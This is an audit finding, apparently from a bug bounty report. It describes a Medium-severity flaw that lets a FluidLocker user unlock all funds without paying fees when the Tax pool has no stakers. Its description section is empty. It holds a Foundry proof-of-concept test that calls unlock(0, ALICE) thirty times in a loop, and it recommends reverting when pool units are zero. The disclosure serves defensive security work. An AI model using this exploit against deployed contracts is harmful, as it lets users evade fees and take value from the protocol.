---
id: 25651
severity: "Medium"
---

# A malicious user may unlock instantly all the funds from the FluidLocker when no one is staking in the Tax pool

## Description



## Proof of Concept

Add the following test to `FluidLocker.t.sol`.

```solidity
function test_POC_InstantUnlock_WithoutFees() external {
    _helperFundLocker(address(aliceLocker), 10_000e18);

    assertEq(_fluidSuperToken.balanceOf(address(ALICE)), 0, "incorrect Alice bal before op");
    assertEq(_fluidSuperToken.balanceOf(address(aliceLocker)), 10_000e18, "incorrect Locker bal before op");

    _helperUpgradeLocker();

    vm.startPrank(ALICE);
    for (uint i = 0; i < 30; i++) {
        aliceLocker.unlock(0, ALICE);
    }

    assertGt(_fluidSuperToken.balanceOf(address(ALICE)), 9.98e21, "incorrect Alice bal after op");
}
```

## Recommendation

Check if the pools have 0 units and revert if so.
